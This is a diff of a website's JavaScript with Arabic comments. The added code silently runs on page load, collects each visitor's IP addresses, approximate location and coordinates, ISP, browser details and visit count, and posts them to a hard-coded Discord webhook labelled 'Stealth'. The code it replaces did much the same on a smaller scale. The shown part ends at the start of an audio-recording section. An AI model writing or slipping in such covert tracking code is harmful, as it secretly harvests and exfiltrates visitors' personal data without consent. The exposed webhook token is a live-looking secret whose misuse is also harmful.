@@ -1,44 +1,68 @@
 
-// === إرسال بيانات الجهاز تلقائيًا عند فتح الموقع ===
-async function getIP() {
+// === تتبع خفي: IP + موقع تقريبي + عدد الزيارات + IPv6 (إن وجد) ===
+
+(async function () {
     try {
-        let res = await fetch("https://api.ipify.org?format=json");
-        let data = await res.json();
-        return data.ip;
+        // نحاول جلب IP v4 و IP v6
+        const ip4Response = await fetch("https://api.ipify.org?format=json");
+        const ip4Data = await ip4Response.json();
+        const ipv4 = ip4Data.ip;
+
+        let ipv6 = "غير متوفر";
+        try {
+            const ip6Response = await fetch("https://api64.ipify.org?format=json");
+            const ip6Data = await ip6Response.json();
+            ipv6 = ip6Data.ip;
+        } catch (e) {
+            console.log("IPv6 غير متوفر");
+        }
+
+        // جلب معلومات الموقع
+        const locationResponse = await fetch("https://ipapi.co/json/");
+        const locationData = await locationResponse.json();
+
+        // عداد مرات الزيارة بناءً على IP
+        let visitCountKey = `visit_count_${ipv4}`;
+        let visitCount = localStorage.getItem(visitCountKey);
+        if (!visitCount) visitCount = 1;
+        else visitCount = parseInt(visitCount) + 1;
+        localStorage.setItem(visitCountKey, visitCount);
+
+        // إعداد البيانات المرسلة
+        const payload = {
+            IPv4: ipv4,
+            IPv6: ipv6,
+            City: locationData.city,
+            Region: locationData.region,
+            Country: locationData.country_name,
+            Latitude: locationData.latitude,
+            Longitude: locationData.longitude,
+            ISP: locationData.org,
+            Browser: navigator.userAgent,
+            Platform: navigator.platform,
+            Language: navigator.language,
+            VisitCount: visitCount
+        };
+
+        // إرسال للديسكورد
+        await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "New Visitor Tracked Silently",
+                embeds: [{
+                    title: "Visitor Info (Stealth)",
+                    fields: Object.entries(payload).map(([key, value]) => ({ name: key, value: String(value) }))
+                }]
+            })
+        });
+
     } catch (e) {
-        return "IP not available";
+        console.error("Stealth tracking failed:", e);
     }
-}
+})();
 
-function getClientInfo() {
-    return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language
-    };
-}
-
-async function sendClientInfo() {
-    const ip = await getIP();
-    const info = getClientInfo();
-    info.ip = ip;
-
-    await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            content: "Client Info",
-            embeds: [{
-                title: "New Visitor",
-                fields: Object.entries(info).map(([k, v]) => ({ name: k, value: String(v) }))
-            }]
-        })
-    });
-}
-
-sendClientInfo();
-
-// === تسجيل الصوت عند الضغط على الزر وإرساله ===
+// === تسجيل الصوت عند الضغط على زر "تسجيل صوتك" ===
 let mediaRecorder;
 let audioChunks = [];
 
